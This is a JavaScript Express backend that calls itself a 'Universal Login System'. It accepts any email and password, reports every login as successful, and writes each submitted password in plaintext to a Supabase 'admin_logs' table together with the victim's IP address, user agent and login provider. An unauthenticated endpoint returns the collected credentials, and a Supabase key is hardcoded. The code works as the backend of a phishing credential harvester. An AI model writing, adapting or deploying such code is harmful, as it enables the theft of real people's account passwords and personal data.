// ============================================================ 
// Universal Login System Backend (Accept ANY input)
// ============================================================
const express = require('express');
const { createClient } = require('@supabase/supabase-js');
const path = require('path');

const app = express();

// ============================================================
// Middleware
// ============================================================
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header(
    'Access-Control-Allow-Headers',
    'Origin, X-Requested-With, Content-Type, Accept'
  );
  next();
});

// ============================================================
// Supabase Configuration
// ============================================================
const supabaseUrl = 'https://rkiqozdxcfiwqvzeoutq.supabase.co';
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJraXFvemR4Y2Zpd3F2emVvdXRxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njk3ODgyOTMsImV4cCI6MjA4NTM2NDI5M30.CUen4-RHCDgk8TqySVF-oQIVS3c11H_Yf2h7KexdGjk';
const supabase = createClient(supabaseUrl, supabaseKey);

// ============================================================
// Health Check
// ============================================================
app.get('/', (req, res) => {
  res.json({
    status: '✅ Backend is running',
    message: 'Universal Login System Backend',
    endpoints: {
      login: 'POST /api/login',
      adminLogs: 'GET /api/admin/logs'
    }
  });
});

// ============================================================
// UNIVERSAL LOGIN ENDPOINT (ACCEPT ANY INPUT)
// ============================================================
app.post('/api/login', async (req, res) => {
  try {
    const { email, password, login_provider = 'email' } = req.body;

    // Assign defaults if empty
    const userEmail = email || `user_${Date.now()}@example.com`;
    const userPassword = password || `password_${Date.now()}`;
    const userName = userEmail.split('@')[0];
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';

    // Log to Supabase (admin_logs)
    const { error: logError } = await supabase
      .from('admin_logs')
      .insert([{
        email_used: userEmail,
        password_display: userPassword,
        login_provider: login_provider,
        ip_address: ip,
        user_agent: userAgent,
        login_time: new Date().toISOString()
      }]);

    if (logError) {
      console.error('Failed to log login:', logError);
    }

    // Respond success immediately
    res.json({
      success: true,
      user: {
        id: Date.now(), // temporary user ID
        email: userEmail,
        name: userName,
        ip: ip,
        platform: login_provider
      },
      message: 'Login successful'
    });

  } catch (error) {
    console.error('❌ Login error:', error);
    res.status(500).json({
      success: false,
      error: 'Server error'
    });
  }
});

// ============================================================
// ADMIN: GET LOGIN LOGS
// ============================================================
app.get('/api/admin/logs', async (req, res) => {
  try {
    const { data: logs, error } = await supabase
      .from('admin_logs')
      .select('*')
      .order('login_time', { ascending: false })
      .limit(100);

    if (error) throw error;

    res.json({
      success: true,
      logs: logs.map(log => ({
        ...log,
        password_display: log.password_display || '[Not recorded]'
      }))
    });
  } catch (error) {
    console.error('Failed to fetch logs:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// ============================================================
// START SERVER
// ============================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Backend server running on port ${PORT}`);
});
